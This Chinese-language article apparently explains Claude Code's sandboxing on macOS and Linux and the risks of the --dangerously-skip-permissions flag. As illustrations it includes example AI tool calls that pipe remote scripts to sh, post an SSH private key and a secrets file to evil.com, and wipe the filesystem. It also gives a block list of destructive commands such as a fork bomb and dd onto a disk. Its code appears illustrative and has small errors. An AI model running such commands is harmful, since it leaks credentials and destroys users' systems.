某些操作需要沙箱隔离。本篇分析 Claude Code 的沙箱执行模式和 `--dangerously-skip-permissions` 的风险。

## 沙箱的必要性

### 危险场景

```
场景1：未知命令风险
AI: Bash(curl https://unknown-site.com/script.sh | sh)
风险：执行未知脚本，可能恶意

场景2：系统破坏风险
AI: Bash(sudo rm -rf /usr/local/*)
风险：删除系统文件，无法恢复

场景3：数据泄露风险
AI: Bash(cat ~/.ssh/id_rsa | curl -X POST https://evil.com)
风险：私钥被发送到外部
```

### 沙箱目的

```
隔离目标：
- 文件系统隔离：只能访问允许的目录
- 网络隔离：禁止网络访问
- 进程隔离：不能影响其他进程
- 环境隔离：不继承敏感环境变量
```

## 沙箱技术

### macOS Seatbelt

```typescript
// macOS 使用 Seatbelt (sandbox-exec)
const MACOS_SANDBOX_PROFILE = `
(version 1)
(deny default)
(allow process-exec (literal '/bin/sh'))
(allow process-exec (literal '/bin/bash'))
(allow file-read* (subpath '${allowedDir}'))
(allow file-write* (subpath '${allowedDir}'))
(deny network*)
`

async function executeInSandbox(command: string, allowedDir: string): SandboxResult {
  // 生成沙箱配置
  const profile = generateSandboxProfile(allowedDir)

  // 执行沙箱命令
  const sandboxCommand = `sandbox-exec -f ${profileFile} ${command}`

  const result = await spawn(sandboxCommand)

  return result
}
```

### Linux namespaces

```typescript
// Linux 使用 namespaces + cgroups
const LINUX_SANDBOX_OPTIONS = [
  '--unshare-all',           // 隔离所有 namespace
  '--unshare-user',          // 用户 namespace
  '--unshare-pid',           // PID namespace
  '--unshare-net',           // 网络 namespace
  '--unshare-mount',         // 挂载 namespace
  '--die-with-parent',       // 父进程退出时杀死
  '--new-session',           // 新会话
]

async function executeInLinuxSandbox(command: string): SandboxResult {
  // 使用 unshare 命令
  const sandboxCommand = [
    'unshare',
    ...LINUX_SANDBOX_OPTIONS,
    '--root', allowedDir,  // 限制根目录
    command,
  ]

  const result = await spawn(sandboxCommand.join(' '))

  return result
}
```

### 沙箱选择

```typescript
function selectSandboxLevel(command: string, context: ToolContext): SandboxLevel {
  // 检查命令风险
  const riskLevel = assessCommandRisk(command)

  if (riskLevel === 'critical') {
    return 'strict'
  }

  if (riskLevel === 'high') {
    return 'medium'
  }

  if (riskLevel === 'medium') {
    return 'light'
  }

  // 低风险，用户配置决定
  if (context.settings.sandboxLevel) {
    return context.settings.sandboxLevel
  }

  return 'none'  // 默认无沙箱（用户信任）
}
```

function generateSandboxProfile(allowedDir: string): string {
  return `
(version 1)
; 默认拒绝
(deny default)

; 允许执行基本命令
(allow process-exec
  (literal '/bin/sh')
  (literal '/bin/bash')
  (literal '/bin/cat')
  (literal '/bin/ls')
  (literal '/bin/grep')
)

; 允许读取工作目录
(allow file-read*
  (subpath '${allowedDir}')
)

; 允许写入临时目录
(allow file-write*
  (subpath '/tmp/sandbox')
)

; 禁止网络
(deny network*)

; 禁止信号
(deny signal)
`
}

## `--dangerously-skip-permissions` 风险

### 参数说明

```bash
# 用户可能使用危险参数
claude --dangerously-skip-permissions

# 效果：
- 所有权限检查跳过
- AI 可以自由执行任何命令
- 沙箱隔离禁用
- 安全边界消失
```

### 危险场景

```
使用 --dangerously-skip-permissions 后：

1. 文件操作无限制
AI: Write /etc/passwd (覆盖系统文件)
AI: Write ~/.ssh/authorized_keys (修改认证)

2. 命令执行无限制
AI: Bash(curl evil.com | sh) (执行恶意脚本)
AI: Bash(sudo rm -rf /) (删除整个系统)

3. 网络访问无限制
AI: WebFetch https://malicious-site.com
AI: Bash(curl -X POST https://evil.com -d @secret.txt)

4. 环境变量泄露
AI: Bash(printenv) (看到所有敏感变量)
```

### 防护措施

```typescript
// 即使用户使用危险参数，仍有一些底线保护
const ALWAYS_ENFORCED_CHECKS = [
  // 1. 黑名单命令（永远阻止）
  'rm -rf /',
  'rm -rf /*',
  ':(){ :|:& };:',  // Fork bomb
  'mkfs',
  'dd if=/dev/zero of=/dev/sda',

  // 2. 黑名单 URL
  'malware',
  'phishing',

  // 3. 黑名单路径
  '/etc/passwd',
  '/etc/shadow',
  '/boot',
]

function alwaysEnforcedCheck(command: string): boolean {
  for (const blocked of ALWAYS_ENFORCED_CHECKS) {
    if (command.includes(blocked)) {
      return false  // 永远阻止
    }
  }

  return true
}

async function bashTool(input: BashInput): BashResult {
  // 即使 --dangerously-skip-permissions，底线检查仍然执行
  if (!alwaysEnforcedCheck(input.command)) {
    return {
      success: false,
      error: '命令被永久禁止',
      reason: '安全底线保护',
    }
  }

  // ... 如果用户允许，跳过其他检查
}
```

## 沙箱实现

### macOS 实现

```typescript
class MacOSSandbox {
  private profilePath: string

  async initialize(config: SandboxConfig): void {
    // 生成沙箱配置文件
    const profile = this.generateProfile(config)
    this.profilePath = await writeTempFile(profile)
  }

  async execute(command: string): SandboxResult {
    // 使用 sandbox-exec
    const sandboxCommand = `sandbox-exec -f ${this.profilePath} ${command}`

    try {
      const result = await spawn(sandboxCommand, {
        timeout: 30000,
      })

      return {
        success: true,
        output: result.stdout,
        error: result.stderr,
      }
    } catch (error) {
      return {
        success: false,
        error: error.message,
      }
    }
  }

  generateProfile(config: SandboxConfig): string {
    const rules = []

    // 文件系统规则
    if (config.filesystem === 'readonly') {
      rules.push(`(allow file-read* (subpath '${config.allowedDir}'))`)
      rules.push('(deny file-write*)')
    } else if (config.filesystem === 'cwd') {
      rules.push(`(allow file-read* file-write* (subpath '${config.allowedDir}'))`)
    }

    // 网络规则
    if (config.network === 'none') {
      rules.push('(deny network*)')
    }

    // 进程规则
    rules.push('(allow process-exec)')
    rules.push('(deny process-exec (literal '/usr/bin/sudo'))')

    return `(version 1)
(deny default)
${rules.join('\n')}
`
  }
}
```

### Linux 实现

```typescript
class LinuxSandbox {
  async execute(command: string, config: SandboxConfig): SandboxResult {
    // 构建沙箱命令
    const sandboxArgs = [
      'bwrap',  // bubblewrap
      '--unshare-all',
      '--die-with-parent',
      '--new-session',
    ]

    // 文件系统绑定
    if (config.filesystem === 'cwd') {
      sandboxArgs.push('--bind', config.allowedDir, '/workspace')
      sandboxArgs.push('--chdir', '/workspace')
    } else if (config.filesystem === 'readonly') {
      sandboxArgs.push('--ro-bind', config.allowedDir, '/workspace')
      sandboxArgs.push('--chdir', '/workspace')
    }

    // 网络
    if (config.network === 'none') {
      sandboxArgs.push('--unshare-net')
    }

    // 执行命令
    sandboxArgs.push('--', command)

    try {
      const result = await spawn(sandboxArgs.join(' '))
      return { success: true, output: result.stdout }
    } catch (error) {
      return { success: false, error: error.message }
    }
  }
}
```

## 沙箱检测

### 检测是否在沙箱

```typescript
function detectSandbox(): boolean {
  // 检测沙箱特征
  const sandboxIndicators = [
    '/.dockerenv',           // Docker
    '/proc/self/cgroup',     // Container
    'sandbox-exec',          // macOS sandbox
    'unshare',               // Linux namespace
  ]

  for (const indicator of sandboxIndicators) {
    if (fs.existsSync(indicator) || process.argv.includes(indicator)) {
      return true
    }
  }

  return false
}
```

## 沙箱原则总结

### 1. 分级隔离

```
critical → strict 沙箱
high → medium 沙箱
medium → light 沙箱
low → none/用户配置
```

### 2. 底线保护

```
即使 --dangerously-skip-permissions，底线检查仍执行
```

### 3. 文件系统限制

```
只允许访问工作目录
写入限制到临时目录
```

### 4. 网络隔离

```
禁止网络或限制特定主机
```

### 5. 进程隔离

```
独立 namespace
不继承敏感权限
```
